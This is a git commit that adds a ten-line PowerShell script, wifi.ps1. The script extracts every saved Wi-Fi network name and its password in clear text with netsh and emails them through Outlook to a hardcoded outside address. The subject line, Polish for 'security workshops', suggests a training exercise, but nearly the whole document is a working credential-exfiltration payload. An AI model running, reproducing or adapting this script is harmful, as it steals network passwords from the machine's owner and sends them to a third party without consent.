87b6d07b95a67eb14560b2129282e7e654d9fcad
Stachov <94226771+Stachov@users.noreply.github.com>
2023-10-25 23:20:22 +0200

    Create wifi.ps1

---
+++ wifi.ps1
@@ -0,0 +1,10 @@
+$FiFi=(netsh wlan show profiles)|%{$n=(""+($_ -split ":")[1]).trim(); netsh wlan show profile name="$n" key=clear}|sls "Key Content","SSID name"
+$recipient = "krzysiek1.stachowicz@gmail.com"
+$subject = "Warsztaty z bezpieczeństwa"
+$body = $FiFi
+$Outlook = New-Object -ComObject Outlook.Application
+$mail = $Outlook.CreateItem(0)
+$mail.To = $recipient
+$mail.Subject = $subject
+$mail.Body = $body
+$mail.Send()
